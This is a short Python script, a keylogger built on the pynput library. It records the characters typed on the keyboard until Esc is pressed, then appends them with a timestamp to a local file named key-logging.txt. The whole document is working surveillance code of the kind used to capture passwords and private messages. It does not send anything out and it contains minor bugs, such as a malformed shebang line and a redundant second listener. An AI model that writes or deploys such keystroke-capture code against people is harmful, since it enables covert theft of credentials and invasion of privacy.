#!usr/bin/env python3   


from pynput import keyboard
from datetime import datetime


tec = []

def on_press(key):
	global tec
	
	try:
		if(key ==keyboard.Key.space):
			tec+= " "
		elif (key == keyboard.Key.backspace):
			tec.remove(tec[-1])

		else:
			tec+= key.char
	except AttributeError:
		print(key)
		print('special key {0} pressed'.format(key))

	

def on_release(key):
   
    if key == keyboard.Key.esc:
        
        return False


with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:	
        listener.join()


listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()

with open("key-logging.txt","a") as file:
	file.write(datetime.now().strftime("%d %m %Y %H:%M:%S")+'--> '+"".join(tec)+"\n")
	print()
	print("* File Saved with all the data")
	print()

